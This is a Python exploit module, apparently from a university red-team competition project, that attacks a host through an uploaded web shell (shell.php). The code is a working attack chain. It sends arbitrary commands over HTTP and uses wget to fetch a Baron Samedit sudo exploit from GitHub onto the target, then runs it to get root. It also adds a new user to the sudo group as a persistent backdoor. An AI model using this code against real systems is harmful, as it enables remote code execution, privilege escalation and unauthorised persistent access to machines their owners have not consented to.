import urllib
import requests
from Exploit import Exploit, PatchedException
from BetterLogger import logger

COLOR_OKGREEN = '\033[92m'
COLOR_OKBLUE = '\033[94m'
COLOR_ORANGE = '\033[93m'
COLOR_FAIL = '\033[91m'
COLOR_END = '\033[0m'

class ChallengeTwoShellPHP(Exploit):
	"""
	WARNING: It's a bit tricky to tell if our commands were successful because `shell.php` does not return error codes or stderr, make sure to add 'echo $?' or something similar to the end of the command.
	"""
	def __init__(self, ip_address) -> None:
		super().__init__(ip_address=ip_address)

	def run_custom_command(self, command):
		logger.info(f"Running command `{command}`...")
		http_encoded_command_to_run = urllib.parse.quote(command.encode('utf8'))
		server_response = requests.get(f"http://{self.ip_address}/arbitrary_file_upload/images/shell.php?cmd={http_encoded_command_to_run}")
		server_status_code = server_response.status_code
		if server_status_code == 404:
			raise PatchedException(f"Server responded with status code `{server_status_code}` which means the user patched this by removing `shell.php`")
		server_response_text = server_response.text
		command_output = server_response_text.split(f"{command}\n")[1].split("</body>")[0].rstrip()
		logger.info(f"Command returned `{command_output}`.")
		return command_output

	def test_if_vulnerable(self):
		"""
		Returns True if vulnerable and False if not
		"""
		try:
			logger.info("Testing if the target is vulnerable to ChallengeTwoShellPHP...")
			# TODO: Currently I use baron samedit to test if it's vulnerable, maybe I can add an abstraction that tries all local CVEs so I don't need to write this over and over
			command = "whoami"
			server_output = self.run_command_as_root(command=command)
			if "root" in server_output:
				logger.info(f"{COLOR_OKGREEN}The target is vulnerable to ChallengeTwoShellPHP!{COLOR_END}")
				return True
			raise PatchedException()
		except PatchedException:
			logger.info(f"{COLOR_FAIL}The target is not vulnerable to ChallengeTwoShellPHP.{COLOR_END}")
			return False

	def run_command_as_root(self, command):
		logger.info(f"Running command `{command}` on root shell...")
		full_command = f"cd /var/cache/apache2/mod_cache_disk; wget https://raw.githubusercontent.com/joshmcorreia/SDSU_Cyber_Security_Red_Team/main/exploits/baron_samedit.py; echo '{command}' | python3 baron_samedit.py"
		server_output = self.run_custom_command(command=full_command)
		logger.info(f"Root shell returned `{server_output}`.")
		return server_output

	def add_user(self, username):
		"""
		Adds a user to the target with sudo privileges.

		idempotent: True

		Returns True if the user is on the target, or False if not
		"""
		logger.info(f"Adding user `{username}` with sudo privileges...")
		add_user_command = f"useradd -m {username} -g sudo -s /bin/bash 2>&1" # redirect stderr to stdout so it's returned to us
		self.run_command_as_root(add_user_command)

		# validate that the user was successfully added
		check_user_id_command = f"grep -c '^{username}:' /etc/passwd"
		command_output = self.run_command_as_root(check_user_id_command)
		if command_output == "1":
			logger.info(f"Successfully added `{username}` with sudo privileges.")
			return True
		else:
			logger.info(f"Failed to add `{username}` with sudo privileges.")
			return False
